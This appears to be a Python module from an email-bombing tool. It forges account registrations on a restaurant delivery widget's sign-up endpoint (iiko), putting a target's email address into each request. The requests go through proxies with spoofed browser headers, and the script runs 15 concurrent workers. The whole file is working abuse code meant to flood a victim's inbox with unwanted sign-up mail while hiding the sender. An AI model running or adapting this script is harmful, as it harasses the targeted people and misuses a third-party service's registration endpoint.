from os.path import basename

import requests

import module
from module import Spam

headers = {
    'authority': 'deliverywiget.iiko.ru',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://www.expressroll.ru',
    'referer': 'https://www.expressroll.ru/',
    'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
}


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response | None:
        data = 'json=%7B%22name%22%3A%22test%22%2C%22email%22%3A%22wezxasqw%2B1%40gmail.com%22%2C%22phone%22%3A%22%2B72132131321%22%2C%22password%22%3A%22WMz8m59Cy6UeKCX%22%2C%22passwordRepeat%22%3A%22WMz8m59Cy6UeKCX%22%2C%22phoneValidationCode%22%3Anull%2C%22cardNumber%22%3A%22%22%2C%22restaraunt%22%3A%2299583f61-6c21-11e8-80cd-d8d385655247%22%7D&lang=ru'
        data = data.replace('wezxasqw%2B1%40gmail.com', target).replace(
            'test', self.get_text())

        response = requests.post(
            'https://deliverywiget.iiko.ru/Customer/Register/99583f61-6c21-11e8-80cd-d8d385655247',
            headers=headers,
            data=data.encode(),
            proxies=self.get_proxies()
        )
        return response


def main():
    spam = ConcreteSpam(basename(__file__)[:-3], '"success": true')
    res = spam.send_post('wezxasqw@gmail.com'.replace('@', f'%2B{module.generate_text()}%40').replace('+', '%2B'))
    if res:
        spam.run_concurrently(15)


if __name__ == '__main__':
    main()
